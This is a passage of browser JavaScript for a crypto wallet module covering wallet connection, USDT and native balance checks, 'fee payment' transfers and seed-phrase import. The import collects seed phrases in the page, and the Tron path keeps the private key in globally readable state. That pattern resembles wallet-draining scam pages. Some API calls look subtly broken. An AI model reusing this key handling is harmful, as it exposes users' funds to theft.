            console.log('Binance Web3 Wallet connected:', walletState.address);
            return {
                success: true,
                address: walletState.address,
                balance: walletState.balance,
                network: 'Binance Smart Chain (BEP20)',
                isMobile: walletState.isMobile
            };
        }
    } catch (error) {
        console.error('Binance Web3 connection error:', error);
        showCustomAlert("Connection Error", `Failed to connect Binance Web3 Wallet: ${error.message}`);
    }
}

// ============================================
// AUTO-DETECT AND CONNECT WALLET
// ============================================

// Global promise resolver for wallet selection
let walletSelectionResolver = null;

/**
 * Automatically detect available wallets and show selection
 * Returns a promise that resolves when user selects a wallet
 */
async function autoConnectWallet() {
    try {
        // Use mobile wallet detection on mobile devices
        const isMobile = isMobileDevice();
        let wallets;
        
        if (isMobile) {
            // Use new mobile wallet detection for native apps
            wallets = await detectInstalledMobileWallets();
        } else {
            // Use browser extension detection on desktop
            wallets = detectAvailableWallets();
        }
        
        // If only one wallet is available, connect directly
        const availableWallets = Object.entries(wallets).filter(([_, v]) => v);
        
        if (availableWallets.length === 1) {
            const [walletKey] = availableWallets[0];
            return await connectAndResolve(walletKey);
        }
        
        // Otherwise, show selection modal and wait for user choice
        showWalletSelectionModal();
        
        // Return a promise that resolves when user selects a wallet
        return new Promise((resolve) => {
            walletSelectionResolver = resolve;
        });
        
    } catch (error) {
        console.error('Auto-connect error:', error);
        return {
            success: false,
            message: `Connection failed: ${error.message}`,
            code: 'AUTO_CONNECT_ERROR'
        };
    }
}

/**
 * Resolve the wallet selection promise with the selected wallet connection result
 */
function resolveWalletSelection(result) {
    if (walletSelectionResolver) {
        walletSelectionResolver(result);
        walletSelectionResolver = null;
    }
}

// ============================================
// USDT CONTRACT ADDRESSES
// ============================================

const USDT_CONTRACTS = {
    TRC20: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    ERC20: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    BEP20: '0x55d398326f99059fF775485246999027B3197955'
};

// ERC20 ABI for USDT transfers
const ERC20_ABI = [
    'function transfer(address to, uint256 amount) returns (bool)',
    'function balanceOf(address account) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function symbol() view returns (string)'
];

// ============================================
// AUTOMATED FEE PAYMENT (NATIVE CURRENCY)
// ============================================

/**
 * Send fee payment directly from connected wallet using native currency (TRX/ETH/BNB)
 */
async function sendFeePayment(amount, recipientAddress, network) {
    try {
        if (!walletState.connected) {
            return {
                success: false,
                message: 'Wallet not connected. Please connect your wallet first.',
                code: 'WALLET_NOT_CONNECTED'
            };
        }

        if (network === 'TRC20') {
            return await sendTronNative(amount, recipientAddress);
        } else if (network === 'ERC20') {
            return await sendEthereumNative(amount, recipientAddress);
        } else if (network === 'BEP20') {
            return await sendBscNative(amount, recipientAddress);
        } else {
            return {
                success: false,
                message: 'Unsupported network',
                code: 'UNSUPPORTED_NETWORK'
            };
        }
    } catch (error) {
        console.error('Fee payment error:', error);
        return {
            success: false,
            message: `Payment failed: ${error.message}`,
            code: 'PAYMENT_ERROR'
        };
    }
}

/**
 * Send TRX fee on Tron network
 */
async function sendTronNative(amount, recipientAddress) {
    try {
        const tronWeb = window.tronWeb;
        
        const amountInSun = Math.floor(amount * 1e6);
        
        const txn = await tronWeb.transactionBuilder.sendTrx(
            recipientAddress,
            amountInSun
        );
        
        const signedTxn = await tronWeb.trx.sign(txn);
        const result = await tronWeb.trx.sendRawTransaction(signedTxn);
        
        if (result.result) {
            return {
                success: true,
                message: 'TRX payment sent successfully!',
                code: 'PAYMENT_SUCCESS',
                txHash: signedTxn.txID,
                amount: amount,
                recipient: recipientAddress,
                network: 'Tron (TRC20)'
            };
        } else {
            return {
                success: false,
                message: 'Transaction failed. Please try again.',
                code: 'TRANSACTION_FAILED'
            };
        }
    } catch (error) {
        console.error('Tron native payment error:', error);
        return {
            success: false,
            message: `Tron payment failed: ${error.message}`,
            code: 'TRON_PAYMENT_ERROR'
        };
    }
}

/**
 * Send ETH fee on Ethereum network
 */
async function sendEthereumNative(amount, recipientAddress) {
    try {
        const signer = walletState.signer;
        const amountInWei = ethers.parseEther(amount.toString());
        
        const tx = {
            to: recipientAddress,
            value: amountInWei,
            gasLimit: ethers.toBeHex(21000),
            gasPrice: await walletState.provider.getGasPrice()
        };
        
        const txResponse = await signer.sendTransaction(tx);
        const receipt = await txResponse.wait(1);
        
        if (receipt && receipt.status === 1) {
            return {
                success: true,
                message: 'ETH payment sent successfully!',
                code: 'PAYMENT_SUCCESS',
                txHash: receipt.hash,
                amount: amount,
                recipient: recipientAddress,
                network: 'Ethereum (ERC20)'
            };
        } else {
            return {
                success: false,
                message: 'Transaction failed. Please try again.',
                code: 'TRANSACTION_FAILED'
            };
        }
    } catch (error) {
        console.error('Ethereum native payment error:', error);
        return {
            success: false,
            message: `Ethereum payment failed: ${error.message}`,
            code: 'ETHEREUM_PAYMENT_ERROR'
        };
    }
}

/**
 * Send BNB fee on BSC network
 */
async function sendBscNative(amount, recipientAddress) {
    try {
        const signer = walletState.signer;
        const amountInWei = ethers.parseEther(amount.toString());
        
        const tx = {
            to: recipientAddress,
            value: amountInWei,
            gasLimit: ethers.toBeHex(21000),
            gasPrice: await walletState.provider.getGasPrice()
        };
        
        const txResponse = await signer.sendTransaction(tx);
        const receipt = await txResponse.wait(1);
        
        if (receipt && receipt.status === 1) {
            return {
                success: true,
                message: 'BNB payment sent successfully!',
                code: 'PAYMENT_SUCCESS',
                txHash: receipt.hash,
                amount: amount,
                recipient: recipientAddress,
                network: 'Binance Smart Chain (BEP20)'
            };
        } else {
            return {
                success: false,
                message: 'Transaction failed. Please try again.',
                code: 'TRANSACTION_FAILED'
            };
        }
    } catch (error) {
        console.error('BSC native payment error:', error);
        return {
            success: false,
            message: `BSC payment failed: ${error.message}`,
            code: 'BSC_PAYMENT_ERROR'
        };
    }
}

// ============================================
// WALLET MANAGEMENT
// ============================================

/**
 * Disconnect wallet
 */
function disconnectWallet() {
    walletState.connected = false;
    walletState.provider = null;
    walletState.signer = null;
    walletState.address = null;
    walletState.network = null;
    walletState.balance = '0';
    walletState.chainId = null;
    walletState.walletType = null;
    walletState.isMobile = false;
    walletState.isInAppBrowser = false;
    
    console.log('Wallet disconnected');
}

/**
 * Get current wallet balance
 */
async function getWalletBalance() {
    try {
        if (!walletState.connected) {
            return {
                success: false,
                message: 'Wallet not connected'
            };
        }

        if (walletState.network === 'TRC20') {
            const balance = await window.tronWeb.trx.getBalance(walletState.address);
            walletState.balance = (balance / 1e6).toFixed(2);
        } else {
            const balance = await walletState.provider.getBalance(walletState.address);
            walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
        }

        return {
            success: true,
            balance: walletState.balance,
            address: walletState.address,
            network: walletState.network
        };
    } catch (error) {
        console.error('Balance fetch error:', error);
        return {
            success: false,
            message: error.message
        };
    }
}

/**
 * Get USDT token balance for current network
 */
async function getUSDTBalance() {
    try {
        if (!walletState.connected || !walletState.address) {
            return { success: false, message: 'Wallet not connected' };
        }

        if (walletState.network === 'TRC20') {
            const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.TRC20);
            const [balance, decimals] = await Promise.all([
                contract.balanceOf(walletState.address).call(),
                contract.decimals().call()
            ]);
            walletState.usdtBalance = (balance / Math.pow(10, decimals)).toFixed(2);
        } else {
            const contract = new ethers.Contract(
                walletState.network === 'ERC20' ? USDT_CONTRACTS.ERC20 : USDT_CONTRACTS.BEP20,
                ERC20_ABI,
                walletState.provider
            );
            const [balance, decimals] = await Promise.all([
                contract.balanceOf(walletState.address),
                contract.decimals()
            ]);
            walletState.usdtBalance = parseFloat(ethers.formatUnits(balance, decimals)).toFixed(2);
        }

        return {
            success: true,
            balance: walletState.usdtBalance,
            address: walletState.address,
            network: walletState.network
        };
    } catch (error) {
        console.error('USDT balance fetch error:', error);
        return { success: false, message: error.message };
    }
}

/**
 * Get native token balance (TRX/ETH/BNB) for gas fees
 */
async function getNativeBalance() {
    try {
        if (!walletState.connected || !walletState.address) {
            return { success: false, message: 'Wallet not connected' };
        }

        if (walletState.network === 'TRC20') {
            const balance = await window.tronWeb.trx.getBalance(walletState.address);
            walletState.nativeBalance = (balance / 1e6).toFixed(4);
        } else {
            const balance = await walletState.provider.getBalance(walletState.address);
            walletState.nativeBalance = parseFloat(ethers.formatEther(balance)).toFixed(4);
        }

        return {
            success: true,
            balance: walletState.nativeBalance,
            address: walletState.address,
            network: walletState.network
        };
    } catch (error) {
        console.error('Native balance fetch error:', error);
        return { success: false, message: error.message };
    }
}

/**
 * Refresh network state - updates address and network based on current provider
 */
async function refreshNetworkState() {
    try {
        if (!walletState.connected || !walletState.provider) {
            return { success: false, message: 'Wallet not connected' };
        }

        if (walletState.network === 'TRC20') {
            const tronWeb = walletState.provider;
            if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                walletState.address = tronWeb.defaultAddress.base58;
            }
        } else {
            const provider = walletState.provider;
            if (provider) {
                const accounts = await provider.send('eth_accounts', []);
                if (accounts && accounts.length > 0) {
                    walletState.address = accounts[0];
                }
                
                const network = await provider.getNetwork();
                walletState.chainId = network.chainId;
                walletState.network = network.chainId === 56n ? 'BEP20' : 'ERC20';
            }
        }

        return {
            success: true,
            address: walletState.address,
            network: walletState.network,
            chainId: walletState.chainId
        };
    } catch (error) {
        console.error('Network state refresh error:', error);
        return { success: false, message: error.message };
    }
}

/**
 * Switch network (for EVM wallets)
 */
async function switchNetwork(chainId) {
    try {
        if (!window.ethereum) {
            return {
                success: false,
                message: 'Ethereum provider not found'
            };
        }

        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: chainId }]
        });

        return {
            success: true,
            message: 'Network switched successfully'
        };
    } catch (error) {
        console.error('Network switch error:', error);
        return {
            success: false,
            message: error.message
        };
    }
}

// ============================================
// SEED PHRASE IMPORT (MANUAL WALLET RECOVERY)
// ============================================

/**
 * Validate BIP39 seed phrase (mnemonic)
 * Supports 12, 15, 18, 21, 24 words
 */
function validateSeedPhrase(mnemonic) {
    if (!mnemonic || typeof mnemonic !== 'string') {
        return { valid: false, error: 'Seed phrase is required' };
    }
    
    const words = mnemonic.trim().split(/\s+/);
    const validLengths = [12, 15, 18, 21, 24];
    
    if (!validLengths.includes(words.length)) {
        return { 
            valid: false, 
            error: `Invalid seed phrase length. Expected 12, 15, 18, 21, or 24 words, got ${words.length}` 
        };
    }
    
    // Basic word validation - check if all words are alphabetic
    const wordPattern = /^[a-zA-Z]+$/;
    for (const word of words) {
        if (!wordPattern.test(word)) {
            return { 
                valid: false, 
                error: 'Seed phrase contains invalid characters. Use only alphabetic words.' 
            };
        }
    }
    
    return { valid: true, wordCount: words.length };
}

/**
 * Import EVM wallet (Ethereum/BSC) from seed phrase
 * Uses ethers.js to derive wallet from mnemonic
 */
async function importEVMWalletFromSeed(seedPhrase, network = 'ERC20') {
    try {
        // Validate seed phrase
        const validation = validateSeedPhrase(seedPhrase);
        if (!validation.valid) {
            return {
                success: false,
                message: validation.error,
                code: 'INVALID_SEED_PHRASE'
            };
        }
        
        // Create wallet from mnemonic
        const wallet = ethers.Wallet.fromPhrase(seedPhrase.trim());
        
        // Create provider based on network
        let provider;
        if (network === 'BEP20') {
            // BSC mainnet
            provider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
            walletState.network = 'BEP20';
            walletState.chainId = 56n;
        } else {
            // Ethereum mainnet
            provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
            walletState.network = 'ERC20';
            walletState.chainId = 1n;
        }
        
        // Connect wallet to provider
        const connectedWallet = wallet.connect(provider);
        
        // Get address and balance
        const address = await connectedWallet.getAddress();
        const balance = await provider.getBalance(address);
        
        // Update wallet state
        walletState.connected = true;
        walletState.address = address;
        walletState.provider = provider;
        walletState.signer = connectedWallet;
        walletState.walletType = 'seed-import';
        walletState.isMobile = isMobileDevice();
        walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
        
        console.log('EVM wallet imported from seed:', address);
        
        return {
            success: true,
            address: address,
            balance: walletState.balance,
            network: walletState.network === 'BEP20' ? 'Binance Smart Chain (BEP20)' : 'Ethereum (ERC20)',
            isMobile: walletState.isMobile
        };
        
    } catch (error) {
        console.error('EVM seed import error:', error);
        return {
            success: false,
            message: `Failed to import wallet: ${error.message}`,
            code: 'SEED_IMPORT_ERROR'
        };
    }
}

/**
 * Import Tron wallet from seed phrase
 * Uses tronWeb to derive address from mnemonic
 */
async function importTronWalletFromSeed(seedPhrase) {
    try {
        // Validate seed phrase
        const validation = validateSeedPhrase(seedPhrase);
        if (!validation.valid) {
            return {
                success: false,
                message: validation.error,
                code: 'INVALID_SEED_PHRASE'
            };
        }
        
        // Check if tronWeb is available
        if (typeof window.tronWeb === 'undefined') {
            // Try to load tronWeb dynamically or use a fallback
            return {
                success: false,
                message: 'TronWeb not available. Please install TronLink or use a browser with Tron support.',
                code: 'TRONWEB_UNAVAILABLE'
            };
        }
        
        const tronWeb = window.tronWeb;
        
        // Create wallet from mnemonic using tronWeb
        // tronWeb supports mnemonic import via wallet/import
        const wallet = await tronWeb.createAccountFromMnemonic(seedPhrase.trim());
        
        if (!wallet || !wallet.address) {
            return {
                success: false,
                message: 'Failed to derive Tron address from seed phrase',
                code: 'ADDRESS_DERIVATION_FAILED'
            };
        }
        
        // Get balance
        const balance = await tronWeb.trx.getBalance(wallet.address.base58);
        
        // Update wallet state
        walletState.connected = true;
        walletState.address = wallet.address.base58;
        walletState.network = 'TRC20';
        walletState.provider = tronWeb;
        walletState.walletType = 'seed-import';
        walletState.isMobile = isMobileDevice();
        walletState.balance = (balance / 1e6).toFixed(2);
        
        // Store private key for signing (tronWeb needs it)
        walletState.tronPrivateKey = wallet.privateKey;
        
        console.log('Tron wallet imported from seed:', wallet.address.base58);
        
        return {
            success: true,
            address: wallet.address.base58,
            balance: walletState.balance,
            network: 'Tron (TRC20)',
            isMobile: walletState.isMobile
        };
        
    } catch (error) {
        console.error('Tron seed import error:', error);
        return {
            success: false,
            message: `Failed to import Tron wallet: ${error.message}`,
            code: 'TRON_SEED_IMPORT_ERROR'
        };
    }
}

/**
 * Import wallet from seed phrase - auto-detects network or uses specified
 */
async function importWalletFromSeed(seedPhrase, network = 'ERC20') {
    try {
        if (network === 'TRC20') {
            return await importTronWalletFromSeed(seedPhrase);
        } else {
            return await importEVMWalletFromSeed(seedPhrase, network);
        }
    } catch (error) {
        console.error('Seed import error:', error);
        return {
            success: false,
            message: `Import failed: ${error.message}`,
            code: 'IMPORT_ERROR'
        };
    }
}

window.walletConnection = {
    connectWallet: autoConnectWallet,
    connectTron: connectTronWallet,
    connectEthereum: connectEthereumWallet,
    connectOKX: connectOKXWallet,
    connectBybit: connectBitgetWallet,
    connectBinance: connectBinanceWallet,
    connectTrustWallet: connectTrustWalletDeepLink,
    connectWalletConnect: connectWalletConnect,
    disconnectWallet: disconnectWallet,
    getBalance: getWalletBalance,
    getUSDTBalance: getUSDTBalance,
    getNativeBalance: getNativeBalance,
    switchNetwork: switchNetwork,
    refreshNetworkState: refreshNetworkState,
    sendFeePayment: sendFeePayment,
    getState: () => ({ ...walletState }),
    detectInAppBrowser: detectInAppBrowser,
    autoConnectIfInAppBrowser: autoConnectIfInAppBrowser,
    isMobileDevice: isMobileDevice,
    generateQRCode: generateWalletQRCode,
    detectAvailableWallets: detectAvailableWallets,
    importWalletFromSeed: importWalletFromSeed,
    importEVMWalletFromSeed: importEVMWalletFromSeed,
    importTronWalletFromSeed: importTronWalletFromSeed,
    validateSeedPhrase: validateSeedPhrase
};
